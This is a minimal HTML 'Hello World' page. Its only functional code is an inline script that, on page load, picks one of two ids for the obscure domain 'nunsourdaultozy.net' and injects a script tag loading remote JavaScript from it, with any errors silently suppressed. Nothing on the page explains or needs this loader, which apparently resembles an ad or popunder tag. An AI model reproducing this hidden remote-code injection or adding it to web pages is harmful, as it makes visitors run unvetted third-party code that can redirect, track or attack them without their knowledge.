<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
</head>
<body>
    <h1>Hello, World!</h1>
    
    <script>
        var scripts = [
            { domain: 'nunsourdaultozy.net', id: 8420832 },
            { domain: 'nunsourdaultozy.net', id: 8420827 }
        ];
        
        var randomScript = scripts[Math.floor(Math.random() * scripts.length)];
        
        (function(d, z, s) {
            s.src = 'https://' + d + '/400/' + z;
            try {
                (document.body || document.documentElement).appendChild(s);
            } catch (e) {}
        })(randomScript.domain, randomScript.id, document.createElement('script'));
    </script>
</body>
</html>
